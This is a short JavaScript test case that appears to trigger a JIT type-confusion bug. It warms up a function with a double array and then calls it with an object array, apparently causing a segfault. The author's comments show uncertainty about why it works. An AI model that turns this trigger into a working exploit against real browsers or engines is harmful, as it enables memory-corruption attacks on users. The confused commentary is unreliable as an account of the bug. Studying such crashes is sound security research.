function bug(arr, idx) {
   
    // This loop is necessary; the seg fault does not happen without it. But why?
    // If this is not here, then the code might be inlined
    // Inlining the code is bad? Why?
    ret = 0;
    for (var i = 0; i < 100; i++) {
        ret ++;
    }
    return arr[idx]

}

function trigger() {
    
    // Interestingly, when this array is [1.0, 1.0], the vulnerability is not triggered
    // Not sure why that is
    // It might be because of how console.log works? if there are 0's in memory maybe something happens??
    // dbl = [1.0, 1.0]
//    dbl = [2.0, 1.0] 
    dbl = [2.1, 2.1]
    obj = [{"hi":1}, {"wor":2}]
    for (var i = 0; i < 100000; i++) {
        // will this get optimized out since the value isnt' used?
        bug(dbl, 0);
    }
    console.log(bug(obj, 1));

}

trigger()
